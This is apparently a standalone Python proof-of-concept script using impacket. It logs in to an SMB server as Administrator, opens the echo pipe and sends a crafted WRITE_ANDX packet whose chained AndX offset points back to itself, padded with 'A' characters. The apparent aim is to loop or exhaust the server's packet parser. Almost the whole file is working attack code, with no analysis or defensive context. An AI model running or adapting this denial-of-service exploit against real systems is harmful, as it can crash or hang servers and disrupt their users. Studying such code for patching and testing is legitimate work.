import time

from impacket.examples import logger
from impacket import smb


class lotsSMB(smb.SMB):
    def loop_write_andx(self,tid,fid,data, offset = 0, wait_answer=1):
        pkt = smb.NewSMBPacket()
        pkt['Flags1'] = 0x18
        pkt['Flags2'] = 0
        pkt['Tid']    = tid

        writeAndX = smb.SMBCommand(self.SMB_COM_WRITE_ANDX)
        pkt.addCommand(writeAndX)
        
        writeAndX['Parameters'] = smb.SMBWriteAndX_Parameters()
        writeAndX['Parameters']['Fid'] = fid
        writeAndX['Parameters']['Offset'] = offset
        writeAndX['Parameters']['WriteMode'] = 0
        writeAndX['Parameters']['Remaining'] = len(data)
        writeAndX['Parameters']['DataLength'] = len(data)
        writeAndX['Parameters']['DataOffset'] = len(pkt)
        writeAndX['Data'] = data+('A'*4000)

        saved_offset = len(pkt)

        writeAndX2 = smb.SMBCommand(self.SMB_COM_WRITE_ANDX)
        pkt.addCommand(writeAndX2)

        writeAndX2['Parameters'] = smb.SMBWriteAndX_Parameters()
        writeAndX2['Parameters']['Fid'] = fid
        writeAndX2['Parameters']['Offset'] = offset
        writeAndX2['Parameters']['WriteMode'] = 0
        writeAndX2['Parameters']['Remaining'] = len(data)
        writeAndX2['Parameters']['DataLength'] = len(data)
        writeAndX2['Parameters']['DataOffset'] = len(pkt)
        writeAndX2['Data'] = '<pata>\n'

        writeAndX2['Parameters']['AndXCommand'] = self.SMB_COM_WRITE_ANDX
        writeAndX2['Parameters']['AndXOffset'] = saved_offset

        self.sendSMB(pkt)

        if wait_answer:
            pkt = self.recvSMB()
            if pkt.isValidAnswer(self.SMB_COM_WRITE_ANDX):
                return pkt
        return None

# Init the example's logger theme
logger.init()
s = lotsSMB('*SMBSERVER','192.168.1.1')
s.login('Administrator','pasword')
tid = s.tree_connect(r'\\*SMBSERVER\IPC$')
fid = s.open_andx(tid, r'\pipe\echo', smb.SMB_O_CREAT, smb.SMB_O_OPEN)[0]

s.loop_write_andx(tid,fid,'<1234>\n', wait_answer = 0)

time.sleep(2)
s.close(tid,fid)

